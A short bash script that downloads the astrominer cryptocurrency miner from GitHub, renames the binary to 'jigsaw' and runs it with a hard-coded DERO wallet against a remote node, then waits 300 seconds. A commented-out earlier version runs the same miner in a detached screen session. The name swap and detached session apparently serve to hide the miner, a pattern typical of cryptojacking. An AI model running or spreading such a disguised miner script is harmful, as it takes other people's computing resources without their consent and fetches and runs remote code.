#!/bin/bash

#wget -q https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
#tar xf astrominer-V1.4_amd64_rev1.tar.gz
#screen -dmS astro ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xck2qackrzvwlhsfdq94v -r 51.79.30.92:80 -p stratum
#i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
#echo done



wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
tar xf adul.tar.gz
mv astrominer jigsaw
./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r dero-node-va.mysrv.cloud:443 -p rpc   
i=300;while [ $i -gt 0 ];do if [ $i -gt 9 ];then printf "\b\b$i";else  printf "\b\b $i";fi;sleep 1;i=`expr $i - 1`;done
echo done
